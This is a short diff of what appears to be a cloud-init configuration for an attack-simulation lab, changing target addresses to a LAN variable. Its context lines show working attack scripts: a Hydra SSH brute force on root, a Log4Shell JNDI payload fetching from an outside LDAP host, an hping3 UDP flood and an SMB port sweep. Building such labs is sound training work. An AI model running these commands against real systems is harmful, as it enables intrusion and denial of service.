@@ -33,7 +33,7 @@ write_files:
       #!/bin/bash
       # Usage: ./ssh-brute.sh <target_ip>
       # Tente une liste de mots de passe courants sur SSH.
-      TARGET="${1:-192.168.${instance_id + 10}.10}"
+      TARGET="${1:-${lan_base}.10}"
       hydra -l root -P /opt/breach/wordlist.txt -t 4 -f ssh://"$TARGET" 2>&1 | tee /tmp/brute.log
       echo "EXIT:$?"
 
@@ -43,7 +43,7 @@ write_files:
     content: |
       #!/bin/bash
       # Envoie un payload JNDI dans le header User-Agent vers srv-web.
-      TARGET="${1:-192.168.${instance_id + 10}.10}"
+      TARGET="${1:-${lan_base}.10}"
       PAYLOAD='$${jndi:ldap://infected.breach.local:1389/exploit}'
       for i in $(seq 1 20); do
         curl -s -H "User-Agent: $PAYLOAD" "http://$TARGET/" -o /dev/null
@@ -57,7 +57,7 @@ write_files:
     content: |
       #!/bin/bash
       # Usage: ./ddos-udp.sh <target_ip> [duration_s]
-      TARGET="${1:-192.168.${instance_id + 10}.10}"
+      TARGET="${1:-${lan_base}.10}"
       DURATION="${2:-10}"
       timeout "$DURATION" hping3 --udp -p 80 --flood "$TARGET" 2>&1 || true
       echo "DDoS terminé"
@@ -76,8 +76,8 @@ write_files:
       done
       echo "[*] Tentative mouvement latéral..."
       for ip in 10 11 12 13 14 16 17 18 19 20; do
-        nc -z -w1 192.168.${instance_id + 10}.$ip 445 2>/dev/null && \
-          echo "[+] Port 445 ouvert sur 192.168.${instance_id + 10}.$ip" || true
+        nc -z -w1 ${lan_base}.$ip 445 2>/dev/null && \
+          echo "[+] Port 445 ouvert sur ${lan_base}.$ip" || true
       done
 
   # ── Wordlist minimale pour brute force ────────────────────────────────────
